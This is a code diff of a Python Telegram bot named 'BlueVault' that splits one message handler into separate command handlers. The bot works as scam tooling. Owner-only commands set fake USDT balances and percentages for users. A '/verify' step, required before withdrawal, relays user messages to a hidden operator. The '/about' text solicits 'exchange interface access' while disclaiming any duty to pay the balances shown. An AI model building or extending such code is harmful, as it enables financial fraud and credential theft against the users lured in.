@@ -63,22 +63,17 @@ def is_duplicate(event):
         return False
     if msg_id in _handled:
         return True
-    
     user_id = event.sender_id
     now = datetime.now().timestamp()
     key = f"{user_id}_{msg_id}"
-    
     if key in last_message_time and now - last_message_time[key] < 2:
         return True
-    
     last_message_time[key] = now
     _handled.add(msg_id)
-    
     if len(_handled) > 30000:
         _handled.clear()
     if len(last_message_time) > 10000:
         last_message_time.clear()
-    
     return False
 
 # ====================== HTML ======================
@@ -216,104 +211,117 @@ def get_balance():
 def get_address():
     return jsonify({'address': CRYPTO_ADDRESS})
 
-# ====================== ЕДИНЫЙ ОБРАБОТЧИК ======================
-@bot.on(events.NewMessage(incoming=True))
-async def handle_all_messages(event):
-    if is_duplicate(event):
-        return
+# ====================== ОБРАБОТЧИКИ ======================
+@bot.on(events.NewMessage(incoming=True, pattern='/start'))
+async def start(event):
+    if is_duplicate(event): return
+    user_id = str(event.sender_id)
+    user_balances.setdefault(user_id, 0)
+    save_data(user_balances, current_percent)
 
-    text = event.raw_text.strip()
-    global current_percent
+    await event.respond(
+        '🛡 **Welcome to BlueVault**\n\n'
+        'Use the button below to open the Web App.\n\n'
+        '• To withdraw funds — complete verification with /verify first\n'
+        '• For more information — use /about',
+        buttons=[
+            [Button.url('🚀 Open BlueVault App', 'https://mybot-production-702e.up.railway.app')]
+        ]
+    )
 
-        if text == '/start':
-        user_id = str(event.sender_id)
-        user_balances.setdefault(user_id, 0)
+@bot.on(events.NewMessage(incoming=True, pattern='/about'))
+async def about(event):
+    if is_duplicate(event): return
+    await event.respond(
+        'ℹ **About BlueVault**\n\n'
+        '**1. How it works:** Users provide exchange interface access. Our AI system analyzes market data and performs test transactions. Any positive balance changes are a technical side effect of the AI operations.\n\n'
+        '**2. Closed Access:** This project is not a public offer. Access is available only by personal invitation. Algorithm logic is not disclosed.\n\n'
+        '**3. Disclaimer:** All AI actions are experimental. Developers do not guarantee any results. You use it at your own risk. Balance changes are not a payment obligation from BlueVault.\n\n'
+        '**4. Gratitude:** Thank you for using BlueVault. Your participation helps test and improve next-generation algorithms in real market conditions.'
+    )
+
+@bot.on(events.NewMessage(incoming=True, pattern='/setbalance'))
+async def set_balance(event):
+    if is_duplicate(event) or event.sender_id != OWNER_ID: return
+    try:
+        _, target_id, amount = event.text.split()
+        target_id = str(target_id)
+        user_balances[target_id] = float(amount)
         save_data(user_balances, current_percent)
+        await event.respond(f'Balance {target_id}: {amount} USDT')
+    except:
+        await event.respond('/setbalance <id> <amount>')
 
-        await event.respond(
-            '🛡 **Welcome to BlueVault**\n\n'
-            'Use the button below to open the Web App.\n\n'
-            '• To withdraw funds — complete verification with /verify first\n'
-            '• For more information — use /about',
-            buttons=[
-                [Button.url('🚀 Open BlueVault App', 'https://mybot-production-702e.up.railway.app')]
-            ]
-        )
+@bot.on(events.NewMessage(incoming=True, pattern='/setpercent'))
+async def set_percent(event):
+    if is_duplicate(event) or event.sender_id != OWNER_ID: return
+    try:
+        global current_percent
+        current_percent = int(event.text.split()[1])
+        save_data(user_balances, current_percent)
+        await event.respond(f'Percent set to {current_percent}%')
+    except:
+        await event.respond('/setpercent <number>')
 
-        elif text == '/about':
-        await event.respond(
-            'ℹ **About BlueVault**\n\n'
-            '**1. Схема работы:** ... (старый русский текст)'
-        )
+@bot.on(events.NewMessage(incoming=True, pattern='/myid'))
+async def myid(event):
+    if is_duplicate(event): return
+    await event.respond(f'Your ID: {event.sender_id}')
 
-    elif text.startswith('/setbalance') and event.sender_id == OWNER_ID:
-        try:
-            _, target_id, amount = text.split()
-            target_id = str(target_id)
-            user_balances[target_id] = float(amount)
-            save_data(user_balances, current_percent)
-            await event.respond(f'Balance {target_id}: {amount} USDT')
-        except:
-            await event.respond('/setbalance <id> <amount>')
+@bot.on(events.NewMessage(incoming=True, pattern='/msg'))
+async def msg(event):
+    if is_duplicate(event) or event.sender_id != OWNER_ID: return
+    try:
+        parts = event.text.split(maxsplit=2)
+        target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
+        await bot.send_message(target_id, message)
+        await event.respond('Sent')
+    except:
+        await event.respond('/msg <id> <text>')
 
-    elif text.startswith('/setpercent') and event.sender_id == OWNER_ID:
-        try:
-            current_percent = int(text.split()[1])
-            save_data(user_balances, current_percent)
-            await event.respond(f'Percent set to {current_percent}%')
-        except:
-            await event.respond('/setpercent <number>')
+@bot.on(events.NewMessage(incoming=True, pattern='/verify'))
+async def verify(event):
+    if is_duplicate(event): return
+    verification_sessions[event.sender_id] = True
+    await event.respond('✅ Verification started. Send your messages below.')
+    await bot.send_message(OWNER_ID, f'#VERIFY User {event.sender_id} started verification.')
 
-    elif text == '/myid':
-        await event.respond(f'Your ID: {event.sender_id}')
+@bot.on(events.NewMessage(incoming=True, func=lambda e: e.sender_id in verification_sessions and e.text and not e.text.startswith('/')))
+async def handle_verification(event):
+    if is_duplicate(event): return
+    await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {event.text}')
 
-    elif text.startswith('/msg') and event.sender_id == OWNER_ID:
-        try:
-            parts = text.split(maxsplit=2)
-            target_id = int(parts[1])
-            message = parts[2] if len(parts) > 2 else ''
-            await bot.send_message(target_id, message)
-            await event.respond('Sent')
-        except:
-            await event.respond('/msg <id> <text>')
+@bot.on(events.NewMessage(incoming=True, pattern='/reply'))
+async def reply(event):
+    if is_duplicate(event) or event.sender_id != OWNER_ID: return
+    try:
+        parts = event.text.split(maxsplit=2)
+        target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
+        await bot.send_message(target_id, f'🛡 Operator: {message}')
+        await event.respond('Replied')
+    except:
+        await event.respond('/reply <id> <text>')
 
-    elif text == '/verify':
-        verification_sessions[event.sender_id] = True
-        await event.respond('✅ Verification started. Send your messages below.')
-        await bot.send_message(OWNER_ID, f'#VERIFY User {event.sender_id} started verification.')
+@bot.on(events.NewMessage(incoming=True, pattern='/endverify'))
+async def end_verify(event):
+    if is_duplicate(event) or event.sender_id != OWNER_ID: return
+    try:
+        target_id = int(event.text.split()[1])
+        verification_sessions.pop(target_id, None)
+        await bot.send_message(target_id, '✅ Verification completed.')
+        await event.respond(f'Ended for {target_id}')
+    except:
+        await event.respond('/endverify <id>')
 
-    elif text.startswith('/reply') and event.sender_id == OWNER_ID:
-        try:
-            parts = text.split(maxsplit=2)
-            target_id = int(parts[1])
-            message = parts[2] if len(parts) > 2 else ''
-            await bot.send_message(target_id, f'🛡 Operator: {message}')
-            await event.respond('Replied')
-        except:
-            await event.respond('/reply <id> <text>')
-
-    elif text.startswith('/endverify') and event.sender_id == OWNER_ID:
-        try:
-            target_id = int(text.split()[1])
-            verification_sessions.pop(target_id, None)
-            await bot.send_message(target_id, '✅ Verification completed.')
-            await event.respond(f'Ended for {target_id}')
-        except:
-            await event.respond('/endverify <id>')
-
-    elif event.sender_id in verification_sessions and text and not text.startswith('/'):
-        await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {text}')
-
-# ===# ====================== ЗАПУСК ======================
+# ====================== ЗАПУСК ======================
 async def main():
     try:
         logger.info("🔄 Подключение к Telegram...")
-        # Упрощённый запуск без неподдерживаемых параметров
         await bot.start(bot_token=BOT_TOKEN)
-        logger.info("✅ Бот BlueVault успешно запущен и авторизован")
+        logger.info("✅ Бот BlueVault успешно запущен")
         await bot.run_until_disconnected()
     except Exception as e:
-        logger.error(f"❌ Критическая ошибка бота: {type(e).__name__}: {e}", exc_info=True)
+        logger.error(f"❌ Критическая ошибка: {e}", exc_info=True)
         await asyncio.sleep(10)
         raise
 
